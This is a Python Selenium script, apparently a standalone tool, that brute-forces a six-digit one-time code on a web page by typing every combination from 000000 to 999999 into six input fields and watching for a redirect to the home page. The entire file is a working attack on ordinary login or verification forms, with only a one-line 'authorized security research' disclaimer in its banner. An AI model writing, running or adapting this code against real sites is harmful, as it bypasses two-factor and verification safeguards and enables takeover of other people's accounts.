from selenium import webdriver
from selenium.webdriver.common.by import By
import time

def try_6_digit_codes_redirect(url, home_page_url):
    """
    Attempts all 6-digit numerical combinations directly into the code input fields.
    Assumes successful code entry redirects to the home page.

    Args:
        url (str): The URL of the page with the 6-digit code input fields.
        home_page_url (str): The expected URL of the home page after successful code entry.
    """
    driver = webdriver.Chrome()  # Or any other browser driver you prefer
    driver.get(url)

    code_input_fields = driver.find_elements(By.CLASS_NAME, "input_5ecaa codeInput_584e1")

    if len(code_input_fields) != 6:
        print("Error: Found", len(code_input_fields), "code input fields. Expected 6.")
        driver.quit()
        return

    for code in range(1000000):
        code_str = str(code).zfill(6)  # Pad with leading zeros

        # Fill each input field with a digit
        for i in range(6):
            code_input_fields[i].clear()
            code_input_fields[i].send_keys(code_str[i])

        time.sleep(0.5)  # Adjust delay as needed to allow for potential redirect

        if driver.current_url.lower().startswith(home_page_url.lower()):
            print(f"[+] Success! Code found: {code_str}")
            break
        else:
            # If not redirected, we might need to clear the fields for the next attempt
            for i in range(6):
                code_input_fields[i].clear()

            print(f"[-] Tried code: {code_str} - No redirect.")

    driver.quit()

if __name__ == "__main__":
    banner = r"""
  _____   _____   ______   _______
 |  __ \ |  _  | |  ____| |__   __|
 | |__) | | | | | | |__       | |
 |  _  /  | | | | |  __|      | |
 | | \ \  | |_| | | |____     | |
 |_|  \_\ |_____| |______|    |_|
        6-Digit Code Brute-Forcer (Selenium)
    For authorized security research only.
"""
    print(banner)

    code_entry_url = input("Enter the URL of the code entry page: ")
    expected_home_url = input("Enter the expected URL of the home page after successful code entry: ")

    try_6_digit_codes_redirect(code_entry_url, expected_home_url)
